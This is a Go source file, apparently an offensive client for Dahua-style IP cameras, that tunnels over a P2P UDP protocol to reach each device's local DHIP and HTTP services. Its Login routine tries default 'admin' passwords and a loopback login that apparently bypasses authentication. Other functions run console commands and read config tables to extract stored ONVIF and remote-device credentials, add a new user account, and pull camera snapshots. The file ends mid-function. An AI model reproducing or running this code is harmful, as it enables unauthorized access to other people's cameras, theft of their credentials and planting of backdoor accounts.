package p2p

import (
	"bytes"
	"crypto/md5"
	"crypto/sha1"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"strings"
	"sync"
	"time"
)

type PTCPTunnel struct {
	client   *DHClient
	realm    uint32
	recvBufs map[uint32][]byte
	conn     *net.UDPConn 
	addr     string       
	session  *PTCPSession 
	user     string       
	pass     string       
	sendMu   sync.Mutex   
}

func newTunnel(c *DHClient, conn *net.UDPConn, addr string, session *PTCPSession) *PTCPTunnel {
	return &PTCPTunnel{
		client:   c,
		realm:    rand.Uint32(),
		recvBufs: make(map[uint32][]byte),
		conn:     conn,
		addr:     addr,
		session:  session,
		user:     "",
		pass:     "",
	}
}

func (t *PTCPTunnel) readOneDataForRealm(realm uint32, timeout time.Duration) ([]byte, error) {
	conn := t.conn
	if len(t.recvBufs[realm]) > 0 {
		data := t.recvBufs[realm]
		delete(t.recvBufs, realm)
		return data, nil
	}
	conn.SetReadDeadline(time.Now().Add(timeout))
	for {
		buf := make([]byte, 65536)
		n, _, err := conn.ReadFrom(buf)
		if err != nil {
			return nil, fmt.Errorf("read: %w", err)
		}
		pkt, pErr := ParsePTCPPacket(buf[:n])
		if pErr != nil { continue }
		t.session.Receive(pkt)

		if len(pkt.Body) == 0 {
			t.sendACK()
			continue
		}
		bt := pkt.Body[0]

		if bt == 0x13 {
			t.sendACK()
			continue
		}
		if bt == 0x12 && len(pkt.Body) >= 16 && string(pkt.Body[12:16]) == "DISC" {
			t.sendACK()
			return nil, fmt.Errorf("disconnected")
		}
		if bt == 0x10 || (bt&0xF0) == 0x10 {
			r, payload, pErr := ParsePayloadBody(pkt.Body)
			if pErr != nil { continue }
			if r != realm {
				t.recvBufs[r] = append(t.recvBufs[r], payload...)
				t.sendACK()
				continue
			}
			t.sendACK()
			return payload, nil
		}
	}
}

func (c *DHClient) NewTunnel() *PTCPTunnel {
	return newTunnel(c, c.mainConn, c.agentAddr, c.ptcpSession)
}

func (c *DHClient) NewDirectTunnel() *PTCPTunnel {
	return newTunnel(c, c.deviceConn, c.deviceRAddr, c.devicePTCPSession)
}

func (t *PTCPTunnel) SetAuth(user, pass string) {
	t.user = user
	t.pass = pass
}

func (t *PTCPTunnel) SendDataWithRealm(data []byte, realm uint32) error {
	payloadBody := MakePayloadBody(realm, data)
	t.sendMu.Lock()
	pkt := t.session.Send(payloadBody)
	serialised := pkt.Serialize()
	t.sendMu.Unlock()
	return t.client.sendTo(t.conn, t.addr, serialised)
}

func (t *PTCPTunnel) SendData(data []byte) error {
	return t.SendDataWithRealm(data, t.realm)
}

func (t *PTCPTunnel) ReadData(timeout time.Duration) ([]byte, error) {
	conn := t.conn
	var out []byte

	if len(t.recvBufs[t.realm]) > 0 {
		out = t.recvBufs[t.realm]
		delete(t.recvBufs, t.realm)
	}

	conn.SetReadBuffer(512 * 1024)

	for {
		conn.SetReadDeadline(time.Now().Add(timeout))
		buf := make([]byte, 65536)
		n, _, err := conn.ReadFrom(buf)
		if err != nil {
			if len(out) > 0 {
				return out, nil
			}
			return nil, fmt.Errorf("read tunnel: %w", err)
		}
		pkt, pErr := ParsePTCPPacket(buf[:n])
		if pErr != nil {
			continue
		}
		t.session.Receive(pkt)

		ackNow := true

		if len(pkt.Body) == 0 {
			t.sendACK()
			continue
		}

		bt := pkt.Body[0]

		if bt == 0x12 && len(pkt.Body) >= 16 {
			disc := string(pkt.Body[12:16])
			if disc == "DISC" {
				discRealm := binary.BigEndian.Uint32(pkt.Body[4:8])
				if discRealm != t.realm {
					t.sendACK()
					continue
				}
				t.sendACK() 
				if len(out) > 0 {
					return out, nil
				}
				return nil, fmt.Errorf("tunnel disconnected")
			}
		}

		if bt == 0x13 {
			t.sendACK()
			continue
		}

		if bt == 0x10 || (bt&0xF0) == 0x10 {
			realm, payload, err := ParsePayloadBody(pkt.Body)
			if err != nil {
				if ackNow { t.sendACK() }
				continue
			}
			if realm != t.realm {
				t.recvBufs[realm] = append(t.recvBufs[realm], payload...)
				if ackNow { t.sendACK() }
				continue
			}
			t.sendACK()
			out = append(out, payload...)
			conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
			continue
		}

		if ackNow { t.sendACK() }
	}
}

func (t *PTCPTunnel) sendACK() {
	t.sendMu.Lock()
	ackPkt := t.session.Send([]byte{})
	serialised := ackPkt.Serialize()
	t.sendMu.Unlock()
	t.client.sendTo(t.conn, t.addr, serialised)
}

func (t *PTCPTunnel) DoBindToPort(realm uint32, port int) error {
	return t.doBindWithTarget(realm, fmt.Sprintf("127.0.0.1:%d", port))
}

func (t *PTCPTunnel) doBindWithTarget(realm uint32, target string) error {
	host, portStr, _ := net.SplitHostPort(target)
	var port int
	fmt.Sscanf(portStr, "%d", &port)

	ip := net.ParseIP(host)
	portU32 := uint32(port)

	bindBody := make([]byte, 20)
	bindBody[0] = 0x11
	binary.BigEndian.PutUint32(bindBody[4:8], realm)
	binary.BigEndian.PutUint32(bindBody[12:16], portU32)
	copy(bindBody[16:20], ip.To4())

	t.sendMu.Lock()
	pkt := t.session.Send(bindBody)
	serialised := pkt.Serialize()
	t.sendMu.Unlock()

	conn := t.conn
	destAddr := t.addr

	if err := t.client.sendTo(conn, destAddr, serialised); err != nil {
		return fmt.Errorf("bind send: %w", err)
	}

	deadline := time.Now().Add(10 * time.Second)
	respBuf := make([]byte, 65536)

	for time.Now().Before(deadline) {
		conn.SetReadDeadline(deadline)
		n, _, err := conn.ReadFrom(respBuf)
		if err != nil {
			return fmt.Errorf("bind wait: %w", err)
		}

		resp, pErr := ParsePTCPPacket(respBuf[:n])
		if pErr != nil {
			continue
		}

		t.sendMu.Lock()
		t.session.Receive(resp)
		t.sendMu.Unlock()

		if len(resp.Body) == 0 {
			t.sendACK()
			continue
		}

		bt := resp.Body[0]
		if bt == 0x13 {
			t.sendACK()
			continue
		}

		if bt == 0x12 {
			t.sendACK()
			if len(resp.Body) >= 8 {
				respRealm := binary.BigEndian.Uint32(resp.Body[4:8])
				if respRealm == realm {
					return nil
				}
			} else {
				return nil 
			}
		}
	}

	return fmt.Errorf("bind timeout waiting for realm 0x%08x", realm)
}

func (t *PTCPTunnel) DisconnectRealm(realm uint32) {
	discBody := make([]byte, 16)
	discBody[0] = 0x12
	binary.BigEndian.PutUint32(discBody[4:8], realm)
	copy(discBody[12:16], []byte("DISC"))
	pkt := t.session.Send(discBody)
	t.client.sendTo(t.conn, t.addr, pkt.Serialize())

	t.conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
	buf := make([]byte, 65536)
	for {
		n, _, err := t.conn.ReadFrom(buf)
		if err != nil {
			break
		}
		if rpkt, e := ParsePTCPPacket(buf[:n]); e == nil {
			t.session.Receive(rpkt)
		}
	}
}

func (t *PTCPTunnel) ReadDataForRealm(realm uint32, timeout time.Duration) ([]byte, error) {
	oldRealm := t.realm
	t.realm = realm
	defer func() { t.realm = oldRealm }()
	return t.ReadData(timeout)
}

func (t *PTCPTunnel) SDKExchange(realm uint32, cmd []byte, timeout time.Duration) ([]byte, error) {
	if err := t.SendDataWithRealm(cmd, realm); err != nil {
		return nil, fmt.Errorf("sdk send: %w", err)
	}
	return t.ReadDataForRealm(realm, timeout)
}

func (t *PTCPTunnel) SDKExchangeSingle(realm uint32, cmd []byte, timeout time.Duration) ([]byte, error) {
	if err := t.SendDataWithRealm(cmd, realm); err != nil {
		return nil, fmt.Errorf("sdk send: %w", err)
	}
	resp, err := t.readDataSkipDisc(realm, timeout)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func (t *PTCPTunnel) readDataSkipDisc(realm uint32, timeout time.Duration) ([]byte, error) {
	conn := t.conn
	deadline := time.Now().Add(timeout)

	if len(t.recvBufs[realm]) > 0 {
		data := t.recvBufs[realm]
		delete(t.recvBufs, realm)
		return data, nil
	}

	var result []byte
	resultDeadline := deadline

	for time.Now().Before(resultDeadline) {
		conn.SetReadDeadline(resultDeadline)
		buf := make([]byte, 65536)
		n, _, err := conn.ReadFrom(buf)
		if err != nil {
			break
		}
		pkt, pErr := ParsePTCPPacket(buf[:n])
		if pErr != nil {
			continue
		}
		t.session.Receive(pkt)

		if len(pkt.Body) == 0 {
			t.sendACK()
			continue
		}
		bt := pkt.Body[0]

		if bt == 0x13 {
			t.sendACK()
			continue
		}
		if bt == 0x12 && len(pkt.Body) >= 16 && string(pkt.Body[12:16]) == "DISC" {
			t.sendACK()
			continue
		}
		if bt == 0x10 || (bt&0xF0) == 0x10 {
			r, payload, err := ParsePayloadBody(pkt.Body)
			if err != nil {
				t.sendACK()
				continue
			}
			if r != realm {
				t.recvBufs[r] = append(t.recvBufs[r], payload...)
				t.sendACK()
				continue
			}
			result = append(result, payload...)
			t.sendACK()
			resultDeadline = time.Now().Add(200 * time.Millisecond)
		}
	}

	if len(result) == 0 {
		return nil, fmt.Errorf("read: timeout waiting for realm 0x%08x data", realm)
	}
	return result, nil
}

func (t *PTCPTunnel) Disconnect() error {
	discBody := make([]byte, 16)
	discBody[0] = 0x12
	binary.BigEndian.PutUint32(discBody[4:8], t.realm)
	copy(discBody[12:16], []byte("DISC"))

	pkt := t.session.Send(discBody)
	return t.client.sendTo(t.conn, t.addr, pkt.Serialize())
}

func (t *PTCPTunnel) DoHTTP(req []byte, timeout time.Duration) ([]byte, error) {
	return t.doHTTP(req, timeout)
}

func selectAuthHeader(reqStr string, authHeaders []string, user, pass string) string {
	selected := ""
	priority := 0 
	for _, h := range authHeaders {
		var p int
		switch {
		case strings.HasPrefix(h, "Digest"):
			p = 4
		case strings.HasPrefix(h, "Basic"):
			p = 3
		case strings.HasPrefix(h, "WSSE"):
			p = 2
		default:
			p = 1
		}
		if p > priority {
			priority = p
			selected = h
		}
	}
	if selected == "" {
		return ""
	}

	if strings.HasPrefix(selected, "Digest") {
		method := "GET"
		uri := "/"
		if parts := strings.SplitN(reqStr, " ", 3); len(parts) >= 2 {
			method = parts[0]
			uri = parts[1]
		}
		return digestAuthHeader(user, pass, method, uri, selected)
	}
	if strings.HasPrefix(selected, "Basic") {
		return basicAuthHeader(user, pass)
	}
	if strings.HasPrefix(selected, "WSSE") {
		return wsseAuthHeader(user, pass)
	}
	return wsseAuthHeader(user, pass)
}

func parseWWWAuthHeaders(respStr string) []string {
	var authHeaders []string
	for _, line := range strings.Split(respStr, "\r\n") {
		if strings.HasPrefix(line, "WWW-Authenticate:") || strings.HasPrefix(line, "www-authenticate:") {
			v := strings.TrimPrefix(strings.TrimPrefix(line, "WWW-Authenticate:"), "www-authenticate:")
			v = strings.TrimSpace(v)
			if v != "" {
				authHeaders = append(authHeaders, v)
			}
		}
	}
	return authHeaders
}

func (t *PTCPTunnel) DoHTTPAuth(req []byte, timeout time.Duration) ([]byte, error) {
	reqStr := string(req)
	if t.client.sessionID != "" && !strings.Contains(reqStr, "Cookie:") {
		reqStr = addHeader(reqStr, "Cookie", "WebClientSessionID="+t.client.sessionID)
	}
	noAuthReq := removeAuthHeader(reqStr)
	resp, err := t.doHTTP([]byte(noAuthReq), timeout)
	if err != nil {
		return nil, err
	}

	respStr := string(resp)
	if !strings.Contains(respStr, "401 Unauthorized") {
		return resp, nil
	}

	authHeaders := parseWWWAuthHeaders(respStr)
	if len(authHeaders) == 0 {
		return resp, nil
	}
	selected := selectAuthHeader(reqStr, authHeaders, t.user, t.pass)
	if selected == "" {
		return resp, nil
	}

	authReq := insertAuthHeader(reqStr, selected)
	return t.doHTTP([]byte(authReq), timeout)
}

func (t *PTCPTunnel) DoHTTPAuthOnRealm(realm uint32, req []byte, timeout time.Duration) ([]byte, error) {
	reqStr := string(req)
	if t.client.sessionID != "" && !strings.Contains(reqStr, "Cookie:") {
		reqStr = addHeader(reqStr, "Cookie", "WebClientSessionID="+t.client.sessionID)
	}
	noAuthReq := removeAuthHeader(reqStr)
	resp, err := t.DoHTTPOnRealm(realm, []byte(noAuthReq), timeout)
	if err != nil {
		return nil, err
	}

	respStr := string(resp)
	if !strings.Contains(respStr, "401 Unauthorized") {
		return resp, nil
	}

	authHeaders := parseWWWAuthHeaders(respStr)
	if len(authHeaders) == 0 {
		return resp, nil
	}
	selected := selectAuthHeader(reqStr, authHeaders, t.user, t.pass)
	if selected == "" {
		return resp, nil
	}

	authReq := insertAuthHeader(reqStr, selected)
	return t.DoHTTPOnRealm(realm, []byte(authReq), timeout)
}

func (t *PTCPTunnel) readHTTPPayload(realm uint32, out []byte, timeout time.Duration) ([]byte, error) {
	conn := t.conn
	if timeout > 0 {
		conn.SetReadDeadline(time.Now().Add(timeout))
	} else {
		conn.SetReadDeadline(time.Time{})
	}

	if len(t.recvBufs[realm]) > 0 {
		data := t.recvBufs[realm]
		delete(t.recvBufs, realm)
		return data, nil
	}

	for {
		buf := make([]byte, 65536)
		n, _, err := conn.ReadFrom(buf)
		if err != nil {
			return nil, err
		}
		pkt, pErr := ParsePTCPPacket(buf[:n])
		if pErr != nil {
			continue
		}
		t.session.Receive(pkt)

		if len(pkt.Body) == 0 {
			t.sendACK()
			continue
		}
		bt := pkt.Body[0]

		if bt == 0x13 {
			t.sendACK()
			continue
		}
		if bt == 0x12 && len(pkt.Body) >= 16 && string(pkt.Body[12:16]) == "DISC" {
			discRealm := binary.BigEndian.Uint32(pkt.Body[4:8])
			if discRealm != realm {
				t.sendACK()
				continue
			}
			t.sendACK()
			if len(out) > 0 {
				return out, nil
			}
			return nil, fmt.Errorf("disconnected")
		}
		if bt == 0x10 || (bt&0xF0) == 0x10 {
			r, payload, err := ParsePayloadBody(pkt.Body)
			if err != nil {
				t.sendACK()
				continue
			}
			if r != realm {
				t.recvBufs[r] = append(t.recvBufs[r], payload...)
				t.sendACK()
				continue
			}
			t.sendACK()
			return payload, nil
		}
		t.sendACK()
	}
}

func (t *PTCPTunnel) DoHTTPOnRealm(realm uint32, req []byte, timeout time.Duration) ([]byte, error) {
	if err := t.SendDataWithRealm(req, realm); err != nil {
		return nil, fmt.Errorf("send http on realm: %w", err)
	}

	var fullResp []byte
	for {
		data, err := t.readHTTPPayload(realm, fullResp, timeout)
		if err != nil {
			if len(fullResp) > 0 {
				return fullResp, nil
			}
			return nil, fmt.Errorf("read http on realm: %w", err)
		}
		fullResp = append(fullResp, data...)

		headerEnd := findHeaderEnd(fullResp)
		if headerEnd < 0 {
			continue
		}

		bodyLen := len(fullResp) - headerEnd
		cl := parseContentLength(string(fullResp))
		if cl > 0 {
			if bodyLen >= cl {
				return fullResp, nil
			}
			continue
		}

		bodyStr := string(fullResp[headerEnd:])
		if contains(fullResp, "transfer-encoding: chunked") || strings.HasSuffix(bodyStr, "0\r\n\r\n") {
			if strings.HasSuffix(bodyStr, "0\r\n\r\n") {
				return fullResp, nil
			}
			continue
		}

		if containsJPEGEnd(fullResp[headerEnd:]) {
			return fullResp, nil
		}

		return fullResp, nil
	}
}



type DHIPClient struct {
	tunnel *PTCPTunnel
	realm  uint32
	sess   int
}

var dhipMagic = []byte{0x20, 0x00, 0x00, 0x00, 0x44, 0x48, 0x49, 0x50}


func (t *PTCPTunnel) NewDHIPClient() (*DHIPClient, error) {
	realm := rand.Uint32()
	if err := t.doBindWithTarget(realm, "127.0.0.1:80"); err != nil {
		return nil, fmt.Errorf("dhip bind: %w", err)
	}
	return &DHIPClient{tunnel: t, realm: realm}, nil
}

func (c *DHIPClient) Close() {
	c.tunnel.DisconnectRealm(c.realm)
}


func (c *DHIPClient) send(method string, params any, id int, object any) error {
	body := map[string]any{
		"method":  method,
		"params":  params,
		"id":      id,
		"session": c.sess,
	}
	if object != nil {
		body["object"] = object
	}
	raw, _ := json.Marshal(body)

	hdr := make([]byte, 32)
	copy(hdr[0:8], dhipMagic)
	binary.LittleEndian.PutUint32(hdr[8:12], uint32(c.sess))
	binary.LittleEndian.PutUint32(hdr[12:16], uint32(id))
	binary.LittleEndian.PutUint32(hdr[16:20], uint32(len(raw)))
	binary.LittleEndian.PutUint32(hdr[24:28], uint32(len(raw)))

	return c.tunnel.SendDataWithRealm(append(hdr, raw...), c.realm)
}


func (c *DHIPClient) readPacket(timeout time.Duration) (map[string]any, error) {
	
	
	data, err := c.readBytes(32, timeout)
	if err != nil {
		return nil, fmt.Errorf("dhip read header: %w", err)
	}
	bodyLen := binary.LittleEndian.Uint32(data[16:20])
	if bodyLen > 10*1024*1024 {
		return nil, fmt.Errorf("dhip body too large: %d", bodyLen)
	}
	if bodyLen == 0 {
		return map[string]any{}, nil
	}
	bodyRaw, err := c.readBytes(int(bodyLen), timeout)
	if err != nil {
		return nil, fmt.Errorf("dhip read body: %w", err)
	}
	var pkt map[string]any
	if err := json.Unmarshal(bodyRaw, &pkt); err != nil {
		return nil, fmt.Errorf("dhip json: %w", err)
	}
	return pkt, nil
}


func (c *DHIPClient) readBytes(n int, timeout time.Duration) ([]byte, error) {
	out := make([]byte, 0, n)
	deadline := time.Now().Add(timeout)
	for len(out) < n {
		chunk, err := c.tunnel.readOneDataForRealm(c.realm, time.Until(deadline))
		if err != nil {
			return nil, err
		}
		out = append(out, chunk...)
	}
	
	
	if len(out) > n {
		c.tunnel.recvBufs[c.realm] = append(out[n:], c.tunnel.recvBufs[c.realm]...)
		out = out[:n]
	}
	return out, nil
}



func (c *DHIPClient) Call(method string, params any, id int, object any, notifies *[]map[string]any) (map[string]any, error) {
	if err := c.send(method, params, id, object); err != nil {
		return nil, err
	}
	for {
		pkt, err := c.readPacket(15 * time.Second)
		if err != nil {
			return nil, err
		}
		respID, _ := pkt["id"].(float64)
		if int(respID) == id {
			return pkt, nil
		}
		if notifies != nil {
			*notifies = append(*notifies, pkt)
		}
	}
}



func (c *DHIPClient) Login() error {
	
	r, err := c.Call("global.login", map[string]any{
		"userName":      "admin",
		"password":      "Not Used",
		"clientType":    "NetKeyboard",
		"loginType":     "Direct",
		"authorityType": "Default",
		"passwordType":  "Default",
	}, 1, nil, nil)
	if err != nil {
		return fmt.Errorf("dhip login send: %w", err)
	}
	if result, _ := r["result"].(bool); result {
		c.sess = dhipSessInt(r["session"])
		return nil
	}

	
	params, _ := r["params"].(map[string]any)
	realm, _ := params["realm"].(string)
	random, _ := params["random"].(string)
	challengeSess := dhipSessInt(r["session"])
	c.sess = challengeSess

	if realm != "" && random != "" {
		
		for _, pwd := range []string{"", "admin"} {
			h1 := strings.ToUpper(md5Hex(fmt.Sprintf("admin:%s:%s", realm, pwd)))
			h2 := strings.ToUpper(md5Hex(fmt.Sprintf("admin:%s:%s", random, h1)))
			r2, err := c.Call("global.login", map[string]any{
				"userName":      "admin",
				"password":      h2,
				"clientType":    "NetKeyboard",
				"loginType":     "Direct",
				"passwordType":  "Default",
				"authorityType": "Default",
			}, 1, nil, nil)
			if err != nil {
				continue
			}
			if result, _ := r2["result"].(bool); result {
				c.sess = dhipSessInt(r2["session"])
				return nil
			}
		}

		
		for _, pwd := range []string{"admin", ""} {
			r3, err := c.Call("global.login", map[string]any{
				"userName":      "admin",
				"password":      pwd,
				"clientType":    "Local",
				"loginType":     "Loopback",
				"ipAddr":        "127.0.0.1",
				"passwordType":  "Plain",
				"authorityType": "Default",
			}, 1, nil, nil)
			if err != nil {
				continue
			}
			if result, _ := r3["result"].(bool); result {
				c.sess = dhipSessInt(r3["session"])
				return nil
			}
		}
	}

	return fmt.Errorf("dhip: all login paths failed (realm=%s)", realm)
}



func (c *DHIPClient) ExtractCredsViaConsole() (string, string, bool) {
	r, err := c.Call("console.factory.instance", nil, 4, nil, nil)
	if err != nil || r["result"] == nil {
		return "", "", false
	}
	obj := r["result"]

	if _, err := c.Call("console.attach", map[string]any{"proc": obj}, 8, obj, nil); err != nil {
		return "", "", false
	}

	commands := []string{"OnvifUser -u", "OnvifUser -l", "OnvifUser"}
	for _, cmd := range commands {
		var notifies []map[string]any
		r2, err := c.Call("console.runCmd", map[string]any{"command": cmd}, 6, obj, &notifies)
		if err != nil {
			continue
		}
		if ok, _ := r2["result"].(bool); !ok {
			continue
		}
		user, pass, ok := parseOnvifNotifies(notifies)
		if ok {
			return user, pass, true
		}
	}
	return "", "", false
}



func (c *DHIPClient) ExtractCredsViaConfig() (string, string, bool) {
	r, err := c.Call("configManager.getConfig", map[string]any{"name": "RemoteDevice"}, 5, nil, nil)
	if err != nil {
		return "", "", false
	}
	params, _ := r["params"].(map[string]any)
	if params == nil {
		return "", "", false
	}
	table, _ := params["table"].(map[string]any)
	if table == nil {
		return "", "", false
	}
	for _, raw := range table {
		m, _ := raw.(map[string]any)
		if m == nil {
			continue
		}
		user, _ := m["UserName"].(string)
		pass, _ := m["Password"].(string)
		if user != "" && pass != "" {
			return user, pass, true
		}
	}
	return "", "", false
}


func (c *DHIPClient) AddUserViaDHIP(userName, password, groupID string) error {
	r, err := c.Call("userManager.addUser", map[string]any{
		"user": map[string]any{
			"Name":     userName,
			"Password": password,
			"Group":    groupID,
		},
	}, 6, nil, nil)
	if err != nil {
		return err
	}
	if ok, _ := r["result"].(bool); ok {
		return nil
	}
	return fmt.Errorf("addUser via DHIP: result false")
}


func parseOnvifNotifies(notifies []map[string]any) (string, string, bool) {
	for _, n := range notifies {
		params, _ := n["params"].(map[string]any)
		if params == nil {
			continue
		}
		info, _ := params["info"].(map[string]any)
		if info == nil {
			continue
		}
		dataRaw, _ := info["Data"].([]any)
		var output string
		for _, line := range dataRaw {
			s, _ := line.(string)
			output += s
		}
		if output == "" {
			continue
		}
		
		user, pass, ok := extractCredsFromJSON(output)
		if ok {
			return user, pass, true
		}
		
		user, pass, ok = extractCredsFromLines(output)
		if ok {
			return user, pass, true
		}
	}
	return "", "", false
}

func extractCredsFromJSON(output string) (string, string, bool) {
	for i := 0; i < len(output); i++ {
		if output[i] != '{' {
			continue
		}
		depth := 0
		for j := i; j < len(output); j++ {
			switch output[j] {
			case '{':
				depth++
			case '}':
				depth--
			}
			if depth == 0 {
				var u struct {
					Name     string `json:"Name"`
					Password string `json:"Password"`
				}
				if err := json.Unmarshal([]byte(output[i:j+1]), &u); err == nil {
					if u.Name != "" && u.Password != "" {
						return u.Name, u.Password, true
					}
				}
				i = j
				break
			}
		}
	}
	return "", "", false
}

func extractCredsFromLines(output string) (string, string, bool) {
	lines := strings.Split(output, "\n")
	for i, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Name") && i+1 < len(lines) {
			nextLine := strings.TrimSpace(lines[i+1])
			if strings.HasPrefix(nextLine, "Password") {
				parts := strings.SplitN(line, ":", 2)
				passParts := strings.SplitN(nextLine, ":", 2)
				if len(parts) == 2 && len(passParts) == 2 {
					u := strings.TrimSpace(strings.Trim(parts[1], " ,\""))
					p := strings.TrimSpace(strings.Trim(passParts[1], " ,\""))
					if u != "" && p != "" {
						return u, p, true
					}
				}
			}
		}
	}
	return "", "", false
}

func dhipSessInt(v any) int {
	switch x := v.(type) {
	case float64:
		return int(x)
	case int:
		return x
	}
	return 0
}

func (t *PTCPTunnel) doHTTP(req []byte, timeout time.Duration) ([]byte, error) {
	t.DisconnectRealm(t.realm)
	t.realm = rand.Uint32()
	if err := t.doBind(t.realm); err != nil {
		return nil, fmt.Errorf("bind: %w", err)
	}

	if err := t.SendData(req); err != nil {
		return nil, fmt.Errorf("send http: %w", err)
	}

	var fullResp []byte

	for {
		data, err := t.ReadData(timeout)
		if err != nil {
			if len(fullResp) > 0 {
				return fullResp, nil
			}
			return nil, fmt.Errorf("read http: %w", err)
		}
		fullResp = append(fullResp, data...)

		headerEnd := findHeaderEnd(fullResp)
		if headerEnd < 0 {
			continue 
		}

		bodyLen := len(fullResp) - headerEnd

		cl := parseContentLength(string(fullResp))
		if cl > 0 {
			if bodyLen >= cl {
				return fullResp, nil
			}
			continue 
		}

		bodyStr := string(fullResp[headerEnd:])
		if contains(fullResp, "transfer-encoding: chunked") || strings.HasSuffix(bodyStr, "0\r\n\r\n") {
			if strings.HasSuffix(bodyStr, "0\r\n\r\n") {
				return fullResp, nil
			}
			continue
		}

		return fullResp, nil
	}
}

func (t *PTCPTunnel) doBind(realm uint32) error {
	host := "127.0.0.1"
	port := uint32(80)
	ip := net.ParseIP(host)

	bindBody := make([]byte, 20)
	bindBody[0] = 0x11
	binary.BigEndian.PutUint32(bindBody[4:8], realm)
	binary.BigEndian.PutUint32(bindBody[12:16], port)
	copy(bindBody[16:20], ip.To4())

	conn := t.conn
	destAddr := t.addr

	pkt := t.session.Send(bindBody)
	if err := t.client.sendTo(conn, destAddr, pkt.Serialize()); err != nil {
		return fmt.Errorf("bind send: %w", err)
	}

	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	buf := make([]byte, 4096)
	n, _, err := conn.ReadFrom(buf)
	if err != nil {
		return fmt.Errorf("bind response: %w", err)
	}
	resp, pErr := ParsePTCPPacket(buf[:n])
	if pErr != nil {
		return pErr
	}
	t.session.Receive(resp)

	for attempts := 0; attempts < 5; attempts++ {
		if len(resp.Body) == 0 || resp.Body[0] == 0x13 {
			if len(resp.Body) > 0 && resp.Body[0] == 0x13 {
				ackPkt := t.session.Send([]byte{})
				t.client.sendTo(conn, destAddr, ackPkt.Serialize())
			}
			conn.SetReadDeadline(time.Now().Add(10 * time.Second))
			n, _, err = conn.ReadFrom(buf)
			if err != nil {
				return fmt.Errorf("bind response: %w", err)
			}
			resp, pErr = ParsePTCPPacket(buf[:n])
			if pErr != nil {
				return pErr
			}
			t.session.Receive(resp)
			if len(resp.Body) > 0 && resp.Body[0] == 0x12 {
				break
			}
		} else if len(resp.Body) > 0 && resp.Body[0] == 0x12 {
			break
		} else {
			return fmt.Errorf("unexpected bind response: body[0]=0x%02x", bodyByte(resp.Body))
		}
	}
	if len(resp.Body) == 0 || resp.Body[0] != 0x12 {
		return fmt.Errorf("bind fail: body[0]=0x%02x", bodyByte(resp.Body))
	}
	return nil
}

func wsseAuthHeader(username, password string) string {
	nonce := fmt.Sprintf("%d", rand.Uint32())
	created := time.Now().UTC().Format("2006-01-02T15:04:05Z")
	digestInput := nonce + created + password
	h := sha1.New()
	io.WriteString(h, digestInput)
	digest := base64.StdEncoding.EncodeToString(h.Sum(nil))
	return fmt.Sprintf("Authorization: WSSE profile=\"UsernameToken\"\r\nX-WSSE: UsernameToken Username=\"%s\", PasswordDigest=\"%s\", Nonce=\"%s\", Created=\"%s\"",
		username, digest, nonce, created)
}

func basicAuthHeader(username, password string) string {
	auth := username + ":" + password
	encoded := base64.StdEncoding.EncodeToString([]byte(auth))
	return "Authorization: Basic " + encoded
}

func digestAuthHeader(username, password, method, uri, wwwAuth string) string {
	params := make(map[string]string)
	for _, part := range strings.Split(wwwAuth, ",") {
		part = strings.TrimSpace(part)
		if idx := strings.Index(part, "="); idx >= 0 {
			key := strings.TrimSpace(part[:idx])
			val := strings.Trim(strings.TrimSpace(part[idx+1:]), "\"")
			params[key] = val
		}
	}

	realm := params["realm"]
	nonce := params["nonce"]
	qop := params["qop"]
	opaque := params["opaque"]
	if realm == "" || nonce == "" {
		return ""
	}

	nc := "00000001"
	cnonce := fmt.Sprintf("%08x", rand.Uint32())

	ha1 := md5Hex(username + ":" + realm + ":" + password)
	ha2 := md5Hex(method + ":" + uri)

	var response string
	if qop == "auth" || qop == "auth-int" {
		response = md5Hex(ha1 + ":" + nonce + ":" + nc + ":" + cnonce + ":" + qop + ":" + ha2)
	} else {
		response = md5Hex(ha1 + ":" + nonce + ":" + ha2)
	}

	auth := fmt.Sprintf(`Digest username="%s", realm="%s", nonce="%s", uri="%s", response="%s"`,
		username, realm, nonce, uri, response)
	if opaque != "" {
		auth += fmt.Sprintf(`, opaque="%s"`, opaque)
	}
	if qop != "" {
		auth += fmt.Sprintf(`, qop=%s, nc=%s, cnonce="%s"`, qop, nc, cnonce)
	}
	return "Authorization: " + auth
}

func md5Hex(s string) string {
	h := md5.New()
	io.WriteString(h, s)
	return hex.EncodeToString(h.Sum(nil))
}

func removeAuthHeader(req string) string {
	var result []string
	for _, line := range strings.Split(req, "\r\n") {
		if strings.HasPrefix(line, "Authorization:") || strings.HasPrefix(line, "X-WSSE:") {
			continue
		}
		result = append(result, line)
	}
	return strings.Join(result, "\r\n")
}

func insertAuthHeader(req, authHeader string) string {
	var result []string
	added := false
	for _, line := range strings.Split(req, "\r\n") {
		if strings.HasPrefix(line, "Authorization:") || strings.HasPrefix(line, "X-WSSE:") {
			if !added {
				result = append(result, authHeader)
				added = true
			}
			continue
		}
		result = append(result, line)
	}
	if !added {
		for i, line := range result {
			if line == "" {
				result = append(result[:i], append([]string{authHeader}, result[i:]...)...)
				break
			}
		}
	}
	return strings.Join(result, "\r\n")
}

func addHeader(req, name, value string) string {
	header := name + ": " + value
	var result []string
	added := false
	for _, line := range strings.Split(req, "\r\n") {
		if strings.HasPrefix(line, name+":") {
			if !added {
				result = append(result, header)
				added = true
			}
			continue
		}
		result = append(result, line)
	}
	if !added {
		for i, line := range result {
			if line == "" {
				result = append(result[:i], append([]string{header}, result[i:]...)...)
				break
			}
		}
	}
	return strings.Join(result, "\r\n")
}

func (t *PTCPTunnel) Snapshot(channel int) ([]byte, error) {
	realm := rand.Uint32()
	if err := t.doBindWithTarget(realm, "127.0.0.1:80"); err != nil {
		return nil, fmt.Errorf("snapshot bind: %w", err)
	}
	defer t.DisconnectRealm(realm)

	ch := channel
	if ch <= 0 {
		ch = 1
	}

	req := fmt.Sprintf("GET /cgi-bin/snapshot.cgi?channel=%d HTTP/1.0\r\nHost: 127.0.0.1\r\nUser-Agent: Mozilla/5.0\r\nAccept: image/jpeg\r\n\r\n", ch)
	resp, err := t.DoHTTPAuthOnRealm(realm, []byte(req), 60*time.Second)
	if err != nil {
		return nil, fmt.Errorf("snapshot: %w", err)
	}

	soiIdx := bytes.Index(resp, []byte{0xFF, 0xD8})
	if soiIdx >= 0 {
